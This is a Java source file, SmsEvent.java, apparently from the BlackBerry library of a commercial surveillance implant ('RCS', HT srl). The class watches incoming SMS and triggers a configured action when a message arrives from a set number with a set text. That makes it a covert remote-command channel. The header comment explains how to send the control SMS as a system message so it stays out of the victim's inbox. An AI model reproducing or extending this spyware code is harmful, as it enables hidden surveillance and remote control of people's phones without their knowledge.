//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : SmsEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.io.EOFException;
import java.io.IOException;
import java.io.InterruptedIOException;

import javax.microedition.io.DatagramConnection;
import javax.wireless.messaging.BinaryMessage;
import javax.wireless.messaging.Message;
import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.MessageListener;
import javax.wireless.messaging.TextMessage;

import net.rim.device.api.util.DataBuffer;
import blackberry.agent.sms.SmsListener;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.SmsObserver;
import blackberry.utils.WChar;


/**
 * To prevent this message from appearing in the BlackBerry device user’s inbox,
 * the sending server should configure the SMS message so that the message type
 * is a system message. This message type can be defined by setting the Protocol
 * Identifier (TP-PID) to 64 (0x40), and the Digital Coding Scheme (TP-DCS) to
 * 244 (0xF4), as shown below: 07913180998000F0040491369740F43080224100238
 * A1168656C6C6F62696E61727974706964363
 * http://www.blackberry.com/knowledgecenterpublic/livelink.exe/fetch/2000/
 * 348583
 * /796557/800451/800563/How_To_-_Use_SMS_to_notify_an_application.html?nodeid
 * =1266974&vernum=0
 * 
 * @author user1
 */
public final class SmsEvent extends Event implements MessageListener, SmsObserver {
    //#ifdef DEBUG
    private static Debug debug = new Debug("SmsEvent", DebugLevel.VERBOSE);
    //#endif

    String number;
    String text;
    
    SmsListener smsListener;

    // private final boolean stop = false;
    private DatagramConnection dc;
    MessageConnection mc;

    /**
     * Instantiates a new sms event.
     * 
     * @param actionId
     *            the action id
     * @param confParams
     *            the conf params
     */
    public SmsEvent(final int actionId, final byte[] confParams) {
        super(Event.EVENT_SMS, actionId, confParams, "SmsEvent");
        setPeriod(NEVER);
        
        smsListener = SmsListener.getInstance();
    }

    protected void actualStart() {
        smsListener.addSmsObserver(this);
    }


    protected void actualRun() {
        //#ifdef DEBUG
        debug.trace("actualRun");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    public synchronized void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop");
        //#endif
      
        smsListener.removeSmsObserver(this);
    }

    /*
     * (non-Javadoc)
     * @see
     * javax.wireless.messaging.MessageListener#notifyIncomingMessage(javax.
     * wireless.messaging.MessageConnection)
     */
    public void notifyIncomingMessage(final MessageConnection conn) {
        Message m;
        try {
            m = mc.receive();

            final String address = m.getAddress();
            String msg = null;
            if (m instanceof TextMessage) {
                final TextMessage tm = (TextMessage) m;
                msg = tm.getPayloadText();
                
                if(address.endsWith(number)){
                    //#ifdef DEBUG
                    debug.trace("notifyIncomingMessage: good number "+address);
                    //#endif
                    
                    if( text == null || msg.equals(text) ){
                        //#ifdef DEBUG
                        debug.trace("notifyIncomingMessage good message: " + msg);
                        //#endif
                        
                        trigger();
                    }
                }
                
            } else if (m instanceof BinaryMessage) {
                //final StringBuffer buf = new StringBuffer();
                final byte[] data = ((BinaryMessage) m).getPayloadData();

                // convert Binary Data to Text
                msg = new String(data, "UTF-8");
            } else {
                //#ifdef DEBUG 
                System.out.println("Invalid Message Format");
                System.out.println("Received SMS text from " + address + " : "
                        + msg);
                //#endif
            }
        } catch (final InterruptedIOException e) {
            //#ifdef DEBUG
            debug.error(e.toString());
            //#endif
        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error(e.toString());
            //#endif
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.event.Event#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);
        try {
            int numLen = databuffer.readInt();
            byte[] numberW = new byte[numLen];
            databuffer.read(numberW);

            number = WChar.getString(numberW, true);

            int textLen = databuffer.readInt();
            byte[] textW = new byte[textLen];
            databuffer.read(textW);

            if(textLen > 0 ){
                //#ifdef DEBUG
                debug.trace("parse: we have a text");
                //#endif
                text = WChar.getString(textW, true).toLowerCase();
            }

            //#ifdef DEBUG
            debug.trace("parse number: " + number);
            debug.trace("parse text: " + text);
            //#endif

        } catch (final EOFException e) {

            return false;
        }
        return true;
    }

    public void onNewSms(Message m, boolean incoming) {
        final String address = m.getAddress();
        String msg = null;
        if (m instanceof TextMessage) {
            final TextMessage tm = (TextMessage) m;
            msg = tm.getPayloadText().toLowerCase();
            
            if(incoming && address.endsWith(number)){
                //#ifdef DEBUG
                debug.trace("notifyIncomingMessage: good number "+address);
                //#endif
                
                // case insensitive
                if( text == null || msg.startsWith(text)){
                    //#ifdef DEBUG
                    debug.trace("notifyIncomingMessage good message: " + msg);
                    //#endif
                    
                    trigger();
                }
            }
            
        } else if (m instanceof BinaryMessage) {
            //#ifdef DEBUG
            debug.trace("onNewSms: Binary");
            //#endif
        } else {
          //#ifdef DEBUG
            debug.trace("onNewSms: unknown");
            //#endif
        }
    }
    
    

}
